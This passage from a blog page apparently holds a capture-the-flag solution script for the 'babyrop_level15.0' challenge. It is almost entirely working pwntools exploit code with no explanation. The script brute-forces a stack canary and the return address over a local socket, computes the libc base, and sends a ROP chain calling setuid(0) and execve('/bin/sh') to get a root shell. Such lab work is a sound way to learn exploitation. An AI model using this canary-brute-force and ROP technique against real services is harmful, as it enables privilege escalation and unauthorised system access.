</span></span><span style="display:flex;"><span><span style="color:#75715e"># Many built-in settings can be controlled on the command-line and show up</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for all created processes...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py DEBUG NOASLR</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_process</span>():
</span></span><span style="display:flex;"><span>    process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;babyrop_level15.0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> process <span style="color:#f92672">in</span> psutil<span style="color:#f92672">.</span>process_iter([<span style="color:#e6db74">&#39;pid&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>]):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> process<span style="color:#f92672">.</span>info[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">==</span> process_name:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> process<span style="color:#f92672">.</span>info[<span style="color:#e6db74">&#39;pid&#39;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py GDB</span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#===========================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#===========================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Arch:     amd64-64-little</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># RELRO:    Full RELRO</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stack:    Canary found</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># NX:       NX enabled</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># PIE:      PIE enabled</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-c&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;canary.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>            canary <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(file<span style="color:#f92672">.</span>readline())
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Using canary from file canary.txt&#34;</span>)
</span></span><span style="display:flex;"><span>            file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(canary) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(canary) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bruteforcing byte </span><span style="color:#e6db74">{</span>len(canary) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> of canary with </span><span style="color:#e6db74">{</span>p8(y)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>canary[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>            p <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>, canary, p8(y)
</span></span><span style="display:flex;"><span>            ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;stack smashing&#34;</span> <span style="color:#f92672">in</span> output:
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># start second check</span>
</span></span><span style="display:flex;"><span>                io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;stack smashing&#34;</span> <span style="color:#f92672">in</span> output:
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found value </span><span style="color:#e6db74">{</span>p8(y)<span style="color:#e6db74">}</span><span style="color:#e6db74"> at offset </span><span style="color:#e6db74">{</span>len(canary) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                    io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                    canary <span style="color:#f92672">+=</span> p8(y)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(canary) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Using Canary: </span><span style="color:#e6db74">{</span>canary[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Using Canary: </span><span style="color:#e6db74">{</span>canary<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(canary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;canary.txt&#34;</span>, <span style="color:#e6db74">&#34;w+&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(canary<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret_val <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x69</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;STARTING RET BRUTE PRESS A KEY&#34;</span>)
</span></span><span style="display:flex;"><span>input()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-r&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;ret.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>            ret_val <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(file<span style="color:#f92672">.</span>readline())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(ret_val) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(ret_val) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bruteforcing offset </span><span style="color:#e6db74">{</span>len(ret_val)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> of return value with </span><span style="color:#e6db74">{</span>p8(y)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>ret_val[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>            p <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>, canary, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>,
</span></span><span style="display:flex;"><span>                ret_val, p8(y)
</span></span><span style="display:flex;"><span>            ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>            t <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;stack smashing&#34;</span> <span style="color:#f92672">in</span> t:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;odd&#34;</span>)
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>            print(output)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Welcome&#34;</span> <span style="color:#f92672">in</span> output:
</span></span><span style="display:flex;"><span>                ret_val <span style="color:#f92672">+=</span> p8(y)
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                parent <span style="color:#f92672">=</span> psutil<span style="color:#f92672">.</span>Process(get_process())
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> child <span style="color:#f92672">in</span> parent<span style="color:#f92672">.</span>children(recursive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>                    child<span style="color:#f92672">.</span>kill()
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>            parent <span style="color:#f92672">=</span> psutil<span style="color:#f92672">.</span>Process(get_process())
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> child <span style="color:#f92672">in</span> parent<span style="color:#f92672">.</span>children(recursive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>                child<span style="color:#f92672">.</span>kill()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(ret_val) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret_val <span style="color:#f92672">=</span> ret_val<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(ret_val)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(f&#34;RETURN VALUE: {ret_val.hex()}&#34;)</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;RETURN VALUE: </span><span style="color:#e6db74">{</span>ret_val[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;ret.txt&#34;</span>, <span style="color:#e6db74">&#34;w+&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(ret_val<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(ret_val)
</span></span><span style="display:flex;"><span>print(ret_val<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>ret_val <span style="color:#f92672">=</span> int(ret_val[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()[<span style="color:#ae81ff">2</span>:], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x24069</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret_val = ret_val - 0x24013</span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc base is at </span><span style="color:#e6db74">{</span>hex(ret_val)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> ret_val
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>parent <span style="color:#f92672">=</span> psutil<span style="color:#f92672">.</span>Process(get_process())
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> child <span style="color:#f92672">in</span> parent<span style="color:#f92672">.</span>children(recursive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>    child<span style="color:#f92672">.</span>kill()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>, canary, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>,
</span></span><span style="display:flex;"><span>    p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]), p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>    p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>setuid),
</span></span><span style="display:flex;"><span>    p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]), p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))),
</span></span><span style="display:flex;"><span>    p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]), p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>    p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>execve)
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellcode = asm(shellcraft.sh())</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload = fit({</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     32: 0xdeadbeef,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     &#39;iaaa&#39;: [1, 2, &#39;Hello&#39;, 3]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># }, length=128)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># io.send(payload)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># flag = io.recv(...)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># log.success(flag)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.interactive()</span>
</span></span></code></pre></div>
      </div></div>

  

  
    

  
</article>

  </div>

  
    <footer class="footer">
  <div class="footer__inner">
    
      <div class="copyright">
        <span>uint8_t*</span><span> - 2023</span>
    
      </div>
  </div>
</footer>






<script type="text/javascript" src="/bundle.min.js"></script>





  
</div>

</body>
</html>
